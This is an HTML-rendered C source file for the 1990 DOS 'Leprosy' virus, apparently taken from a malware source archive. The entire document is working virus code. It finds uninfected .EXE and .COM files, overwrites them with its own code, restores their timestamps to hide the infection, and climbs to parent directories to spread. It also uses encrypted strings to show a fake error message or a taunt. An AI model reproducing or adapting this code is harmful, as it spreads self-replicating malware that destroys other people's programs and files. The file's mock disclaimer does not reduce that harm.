<!DOCTYPE html PUBLIC "-//W3C//DTD HTML 4.01//EN" "http://www.w3.org/TR/1999/REC-html401-19991224/strict.dtd">
<html>
<head>
<META http-equiv=Content-Type content="text/html; charset=windows-1252">
<title>Virus.DOS.Leprosy.666.a - leprosy.c.html</title>
<style type="text/css">
span {
	font-family: 'Courier New';
	font-size: 10pt;
	color: #000000;
}
.sc0 {
}
.sc1 {
	color: #008000;
}
.sc4 {
	color: #FF8000;
}
.sc5 {
	font-weight: bold;
	color: #0000FF;
}
.sc6 {
	color: #808080;
}
.sc9 {
	color: #804000;
}
.sc10 {
	font-weight: bold;
	color: #000080;
}
.sc11 {
}
.sc16 {
	color: #8000FF;
}
</style>
</head>
<body>
<div style="float: left; white-space: pre; line-height: 1; background: #FFFFFF; "><span class="sc1">/*  This file is part of the source code to the LEPROSY Virus 1.00
    Copy-ya-right (c) 1990 by PCM2.  This program can cause destruction
    of files; you're warned, the author assumes no responsibility
    for damage this program causes, incidental or otherwise.  This
    program is not intended for general distribution -- irresponsible
    users should not be allowed access to this program, or its
    accompanying files.  (Unlike people like us, of course...)
*/</span><span class="sc0">


</span><span class="sc9">#pragma inline
</span><span class="sc0">
</span><span class="sc9">#define   CRLF       "\x17\x14"          </span><span class="sc1">/*  CR/LF combo encrypted.  */</span><span class="sc0">
</span><span class="sc9">#define   NO_MATCH   0x12                </span><span class="sc1">/*  No match in wildcard search.  */</span><span class="sc0">


</span><span class="sc1">/*  The following strings are not garbled; they are all encrypted  */</span><span class="sc0">
</span><span class="sc1">/*  using the simple technique of adding the integer value 10 to   */</span><span class="sc0">
</span><span class="sc1">/*  each character.  They are automatically decrypted by           */</span><span class="sc0">
</span><span class="sc1">/*  'print_s()', the function which sends the strings to 'stdout'  */</span><span class="sc0">
</span><span class="sc1">/*  using DOS service 09H.  All are terminated with a dollar-sign  */</span><span class="sc0">
</span><span class="sc1">/*  "$" as per DOS service specifications.                         */</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">fake_msg</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">CRLF</span><span class="sc0"> </span><span class="sc6">"Z|yq|kw*~yy*lsq*~y*ps~*sx*wowy|\x83."</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">virus_msg</span><span class="sc10">[</span><span class="sc4">3</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc11">CRLF</span><span class="sc0"> </span><span class="sc6">"\x13XOa]*PVK]R++**cy\x7f|*}\x83}~ow*rk}*loox*sxpom~on*\x81s~r*~ro."</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc11">CRLF</span><span class="sc0"> </span><span class="sc6">"\x13sxm\x7f|klvo*nomk\x83*yp*VOZ\\Y]c*;8::6*k*\x80s|\x7f}*sx\x80ox~on*l\x83."</span><span class="sc10">,</span><span class="sc0">
    </span><span class="sc11">CRLF</span><span class="sc0"> </span><span class="sc6">"\x13ZMW&lt;*sx*T\x7fxo*yp*;CC:8**Qyyn*v\x7fmu+\x17\x14."</span><span class="sc0">
  </span><span class="sc10">};</span><span class="sc0">



</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">_dta</span><span class="sc0">                     </span><span class="sc1">/*  Disk Transfer Area format for find.  */</span><span class="sc0">
  </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">findnext</span><span class="sc10">[</span><span class="sc4">21</span><span class="sc10">];</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">attribute</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">timestamp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">datestamp</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">long</span><span class="sc0"> </span><span class="sc11">filesize</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">filename</span><span class="sc10">[</span><span class="sc4">13</span><span class="sc10">];</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">dta</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">struct</span><span class="sc0"> </span><span class="sc11">_dta</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc4">0x80</span><span class="sc10">;</span><span class="sc0">   </span><span class="sc1">/*  Set it to default DTA.  */</span><span class="sc0">


</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">filler</span><span class="sc10">[]</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc6">"XX"</span><span class="sc10">;</span><span class="sc0">             </span><span class="sc1">/*  Pad file length to 666 bytes.  */</span><span class="sc0">
</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">codestart</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*)</span><span class="sc0"> </span><span class="sc4">0x100</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc1">/*  Memory where virus code begins.  */</span><span class="sc0">
</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">virus_size</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">666</span><span class="sc10">;</span><span class="sc0">      </span><span class="sc1">/*  The size in bytes of the virus code.  */</span><span class="sc0">
</span><span class="sc16">const</span><span class="sc0"> </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">infection_rate</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">4</span><span class="sc10">;</span><span class="sc0">     </span><span class="sc1">/*  How many files to infect per run.  */</span><span class="sc0">

</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">compare_buf</span><span class="sc10">[</span><span class="sc4">20</span><span class="sc10">];</span><span class="sc0">           </span><span class="sc1">/*  Load program here to test infection.  */</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">handle</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc1">/*  The current file handle being used.  */</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">datestamp</span><span class="sc10">,</span><span class="sc0"> </span><span class="sc11">timestamp</span><span class="sc10">;</span><span class="sc0">       </span><span class="sc1">/*  Store original date and time here.  */</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">diseased_count</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc1">/*  How many infected files found so far.  */</span><span class="sc0">
</span><span class="sc16">char</span><span class="sc0"> </span><span class="sc11">success</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">               </span><span class="sc1">/*  How many infected this run.  */</span><span class="sc0">


</span><span class="sc1">/*  The following are function prototypes, in keeping with ANSI    */</span><span class="sc0">
</span><span class="sc1">/*  Standard C, for the support functions of this program.         */</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">find_first</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fn</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">find_healthy</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">find_next</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">healthy</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">close_handle</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">open_handle</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">fn</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">print_s</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">restore_timestamp</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">



</span><span class="sc1">/*----------------------------------*/</span><span class="sc0">
</span><span class="sc1">/*     M A I N    P R O G R A M     */</span><span class="sc0">
</span><span class="sc1">/*----------------------------------*/</span><span class="sc0">

</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">main</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">do</span><span class="sc0"> </span><span class="sc10">{</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">find_healthy</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">           </span><span class="sc1">/*  Is there an un-infected file?  */</span><span class="sc0">
      </span><span class="sc11">infect</span><span class="sc10">();</span><span class="sc0">                        </span><span class="sc1">/*  Well, then infect it!  */</span><span class="sc0">
      </span><span class="sc11">x</span><span class="sc10">++;</span><span class="sc0">                             </span><span class="sc1">/*  Add one to the counter.  */</span><span class="sc0">
      </span><span class="sc11">success</span><span class="sc10">++;</span><span class="sc0">                       </span><span class="sc1">/*  Carve a notch in our belt.  */</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">                            </span><span class="sc1">/*  If there ain't a file here... */</span><span class="sc0">
      </span><span class="sc11">_DX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc6">".."</span><span class="sc10">;</span><span class="sc0">                </span><span class="sc1">/*  See if we can step back to  */</span><span class="sc0">
      </span><span class="sc11">_AH</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x3b</span><span class="sc10">;</span><span class="sc0">                      </span><span class="sc1">/*  the parent directory, and try  */</span><span class="sc0">
      </span><span class="sc11">asm</span><span class="sc0">   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc4">21H</span><span class="sc10">;</span><span class="sc0">                   </span><span class="sc1">/*  there.  */</span><span class="sc0">
      </span><span class="sc11">x</span><span class="sc10">++;</span><span class="sc0">                             </span><span class="sc1">/*  Increment the counter anyway, to  */</span><span class="sc0">
    </span><span class="sc10">}</span><span class="sc0">                                  </span><span class="sc1">/*  avoid infinite loops.  */</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0"> </span><span class="sc5">while</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc11">infection_rate</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">       </span><span class="sc1">/*  Do this until we've had enough.  */</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">success</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">                       </span><span class="sc1">/*  If we got something this time,  */</span><span class="sc0">
    </span><span class="sc11">print_s</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">fake_msg</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">               </span><span class="sc1">/*  feed 'em the phony error line.  */</span><span class="sc0">
  </span><span class="sc5">else</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">diseased_count</span><span class="sc0"> </span><span class="sc10">&gt;</span><span class="sc0"> </span><span class="sc4">6</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">          </span><span class="sc1">/*  If we found 6+ infected files  */</span><span class="sc0">
      </span><span class="sc5">for</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">3</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">x</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">         </span><span class="sc1">/*  along the way, laugh!!  */</span><span class="sc0">
        </span><span class="sc11">print_s</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">virus_msg</span><span class="sc10">[</span><span class="sc11">x</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
      </span><span class="sc11">print_s</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">fake_msg</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">             </span><span class="sc1">/*  Otherwise, keep a low profile.  */</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">infect</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">_DX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">dta</span><span class="sc10">-&gt;</span><span class="sc11">filename</span><span class="sc10">;</span><span class="sc0">  </span><span class="sc1">/*  DX register points to filename.  */</span><span class="sc0">
  </span><span class="sc11">_CX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x00</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/*  No attribute flags are set.  */</span><span class="sc0">
  </span><span class="sc11">_AL</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x01</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/*  Use Set Attribute sub-function.  */</span><span class="sc0">
  </span><span class="sc11">_AH</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x43</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/*  Assure access to write file.  */</span><span class="sc0">
  </span><span class="sc11">asm</span><span class="sc0">   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc4">21H</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc1">/*  Call DOS interrupt.  */</span><span class="sc0">
  </span><span class="sc11">open_handle</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">dta</span><span class="sc10">-&gt;</span><span class="sc11">filename</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">        </span><span class="sc1">/*  Re-open the healthy file.  */</span><span class="sc0">
  </span><span class="sc11">_BX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">handle</span><span class="sc10">;</span><span class="sc0">                       </span><span class="sc1">/*  BX register holds handle.  */</span><span class="sc0">
  </span><span class="sc11">_CX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">virus_size</span><span class="sc10">;</span><span class="sc0">                   </span><span class="sc1">/*  Number of bytes to write.  */</span><span class="sc0">
  </span><span class="sc11">_DX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">codestart</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc1">/*  Write program code.  */</span><span class="sc0">
  </span><span class="sc11">_AH</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x40</span><span class="sc10">;</span><span class="sc0">                         </span><span class="sc1">/*  Set up and call DOS.  */</span><span class="sc0">
  </span><span class="sc11">asm</span><span class="sc0">   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc4">21H</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">restore_timestamp</span><span class="sc10">();</span><span class="sc0">               </span><span class="sc1">/*  Keep original date &amp; time.  */</span><span class="sc0">
  </span><span class="sc11">close_handle</span><span class="sc10">();</span><span class="sc0">                     </span><span class="sc1">/*  Close file.  */</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">find_healthy</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">find_first</span><span class="sc10">(</span><span class="sc6">"*.EXE"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">NO_MATCH</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">       </span><span class="sc1">/*  Find EXE?  */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">healthy</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">                         </span><span class="sc1">/*  If it's healthy, OK!  */</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
      </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">find_next</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">NO_MATCH</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">      </span><span class="sc1">/*  Try a few more otherwise. */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">healthy</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
          </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">                          </span><span class="sc1">/*  If you find one, great!  */</span><span class="sc0">
  </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">find_first</span><span class="sc10">(</span><span class="sc6">"*.COM"</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">NO_MATCH</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">       </span><span class="sc1">/*  Find COM?  */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">healthy</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">                         </span><span class="sc1">/*  If it's healthy, OK!  */</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc5">else</span><span class="sc0">
      </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">find_next</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc11">NO_MATCH</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">      </span><span class="sc1">/*  Try a few more otherwise. */</span><span class="sc0">
        </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">healthy</span><span class="sc10">()</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
          </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">                          </span><span class="sc1">/*  If you find one, great!  */</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">                                  </span><span class="sc1">/*  Otherwise, say so.  */</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">



</span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">healthy</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">datestamp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dta</span><span class="sc10">-&gt;</span><span class="sc11">datestamp</span><span class="sc10">;</span><span class="sc0">        </span><span class="sc1">/*  Save time &amp; date for later.  */</span><span class="sc0">
  </span><span class="sc11">timestamp</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">dta</span><span class="sc10">-&gt;</span><span class="sc11">timestamp</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">open_handle</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">dta</span><span class="sc10">-&gt;</span><span class="sc11">filename</span><span class="sc0"> </span><span class="sc10">);</span><span class="sc0">      </span><span class="sc1">/*  Open last file located.  */</span><span class="sc0">
  </span><span class="sc11">_BX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">handle</span><span class="sc10">;</span><span class="sc0">                      </span><span class="sc1">/*  BX holds current file handle.  */</span><span class="sc0">
  </span><span class="sc11">_CX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">;</span><span class="sc0">                          </span><span class="sc1">/*  We only want a few bytes.  */</span><span class="sc0">
  </span><span class="sc11">_DX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">compare_buf</span><span class="sc10">;</span><span class="sc0">          </span><span class="sc1">/*  DX points to the scratch buffer.  */</span><span class="sc0">
  </span><span class="sc11">_AH</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x3f</span><span class="sc10">;</span><span class="sc0">                       </span><span class="sc1">/*  Read in file for comparison.  */</span><span class="sc0">
  </span><span class="sc11">asm</span><span class="sc0">   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc4">21H</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">restore_timestamp</span><span class="sc10">();</span><span class="sc0">              </span><span class="sc1">/*  Keep original date &amp; time.  */</span><span class="sc0">
  </span><span class="sc11">close_handle</span><span class="sc10">();</span><span class="sc0">                   </span><span class="sc1">/*  Close the file.  */</span><span class="sc0">
  </span><span class="sc5">for</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc0"> </span><span class="sc10">&lt;</span><span class="sc0"> </span><span class="sc4">20</span><span class="sc10">;</span><span class="sc0"> </span><span class="sc11">i</span><span class="sc10">++</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">        </span><span class="sc1">/*  Compare to virus code.  */</span><span class="sc0">
    </span><span class="sc5">if</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc11">compare_buf</span><span class="sc10">[</span><span class="sc11">i</span><span class="sc10">]</span><span class="sc0"> </span><span class="sc10">!=</span><span class="sc0"> </span><span class="sc10">*(</span><span class="sc11">codestart</span><span class="sc10">+</span><span class="sc11">i</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">
      </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">1</span><span class="sc10">;</span><span class="sc0">                     </span><span class="sc1">/*  If no match, return healthy.  */</span><span class="sc0">
  </span><span class="sc11">diseased_count</span><span class="sc10">++;</span><span class="sc0">                 </span><span class="sc1">/*  Chalk up one more fucked file.  */</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc0"> </span><span class="sc4">0</span><span class="sc10">;</span><span class="sc0">                         </span><span class="sc1">/*  Otherwise, return infected.  */</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">restore_timestamp</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">void</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc11">_AL</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x01</span><span class="sc10">;</span><span class="sc0">                         </span><span class="sc1">/*  Keep original date &amp; time.  */</span><span class="sc0">
  </span><span class="sc11">_BX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">handle</span><span class="sc10">;</span><span class="sc0">                       </span><span class="sc1">/*  Same file handle.  */</span><span class="sc0">
  </span><span class="sc11">_CX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">timestamp</span><span class="sc10">;</span><span class="sc0">                    </span><span class="sc1">/*  Get time &amp; date from DTA.  */</span><span class="sc0">
  </span><span class="sc11">_DX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">datestamp</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc11">_AH</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x57</span><span class="sc10">;</span><span class="sc0">                         </span><span class="sc1">/*  Do DOS service.  */</span><span class="sc0">
  </span><span class="sc11">asm</span><span class="sc0">   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc4">21H</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


</span><span class="sc16">void</span><span class="sc0"> </span><span class="sc11">print_s</span><span class="sc10">(</span><span class="sc0"> </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">s</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">
  </span><span class="sc16">char</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">
  </span><span class="sc5">while</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc0"> </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">)</span><span class="sc0">  </span><span class="sc10">{</span><span class="sc0">              </span><span class="sc1">/*  Subtract 10 from every character.  */</span><span class="sc0">
    </span><span class="sc10">*</span><span class="sc11">p</span><span class="sc0"> </span><span class="sc10">-=</span><span class="sc0"> </span><span class="sc4">10</span><span class="sc10">;</span><span class="sc0">
    </span><span class="sc11">p</span><span class="sc10">++;</span><span class="sc0">
  </span><span class="sc10">}</span><span class="sc0">
  </span><span class="sc11">_DX</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc10">(</span><span class="sc16">int</span><span class="sc10">)</span><span class="sc0"> </span><span class="sc11">s</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc1">/*  Set DX to point to adjusted string.   */</span><span class="sc0">
  </span><span class="sc11">_AH</span><span class="sc0"> </span><span class="sc10">=</span><span class="sc0"> </span><span class="sc4">0x09</span><span class="sc10">;</span><span class="sc0">                 </span><span class="sc1">/*  Set DOS function number.  */</span><span class="sc0">
  </span><span class="sc11">asm</span><span class="sc0">   </span><span class="sc16">int</span><span class="sc0"> </span><span class="sc4">21H</span><span class="sc10">;</span><span class="sc0">              </span><span class="sc1">/*  Call DOS interrupt.  */</span><span class="sc0">
  </span><span class="sc5">return</span><span class="sc10">;</span><span class="sc0">
</span><span class="sc10">}</span><span class="sc0">


